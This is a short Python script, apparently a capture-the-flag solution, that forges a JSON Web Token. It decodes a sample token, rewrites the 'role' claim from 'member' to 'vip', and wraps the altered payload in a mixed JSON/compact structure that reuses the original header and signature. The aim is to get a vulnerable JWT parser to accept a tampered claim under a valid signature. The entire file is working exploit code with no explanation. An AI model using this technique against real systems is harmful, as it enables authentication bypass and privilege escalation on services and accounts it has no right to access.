from json import loads, dumps
from jwcrypto.common import base64url_encode, base64url_decode


def topic(topic):
    [header, payload, signature] = topic.split('.')
    parsed_payload = loads(base64url_decode(payload))
    print(parsed_payload)
    parsed_payload["role"] = "vip"
    print(dumps(parsed_payload, separators=(',', ':')))
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    print(fake_payload)
    return '{" ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"} '

print(topic('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTU3NzQwNTgsImlhdCI6MTcxNTc3MDQ1OCwianRpIjoiZ0ZGOEJRZkM4NWFJbkxyWkZCZmlJdyIsIm5iZiI6MTcxNTc3MDQ1OCwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.HQ7SL9D-a0_1-Yh7yHTInk3LAmisGqbwkTqdco4Xu8eSmvK65M-_YEpnL5ZRLvWBhlfcH7632e5NjvjRvw0yh7dqP404x8rItfe3356RBJ7L31bPVrRdVC_9lTms6qOKYTpm40SbsrtJ_w_2m4bhy8rPdXxYBC5DyAzyolIvp9aTIaxImalU8Uk69FUe0Oo7_DokY1cTMPZnuKd6TvPa1NXPeNK4wi_hTHzuJqx3GhWL0IaUm8g9IIDSskgB_bfeP9cBW7sCzRaogVwgVuOxwR4KJLZnpU9BpnDkXbr8hXKcoSXvBwMQR-PLfSqdLT1xYiieyqQH4ukwhTvYKQEL1Q'))

